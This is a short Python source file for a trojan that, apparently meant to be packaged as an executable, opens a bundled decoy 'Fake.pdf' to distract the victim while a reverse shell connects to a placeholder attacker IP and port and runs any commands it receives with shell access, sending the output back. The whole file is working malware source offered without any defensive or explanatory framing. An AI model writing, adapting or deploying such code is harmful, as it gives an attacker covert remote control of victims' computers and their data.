import subprocess
import os
import socket
import shlex
import threading
import sys
import webbrowser
def open_pdf():
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    pdf_path = os.path.join(base_path, "Fake.pdf")
    webbrowser.open(pdf_path)
def connect_back():
    s = socket.socket()
    s.connect(("ATTACKER IP", "PORT"))
    while True:
        try:
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
            if cmd.lower().startswith("cd"):
                try:
                    parts = shlex.split(cmd)
                    if len(parts) > 1:
                        os.chdir(parts[1])
                    s.send(f"{os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[-] {e}\n".encode())
                continue
            output = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            result = output.stdout + output.stderr
            if result:
                s.send(result.encode())
        except Exception as e:
            s.send(f"[-] Error: {e}\n".encode())
    s.close()
threading.Thread(target=open_pdf).start()
connect_back()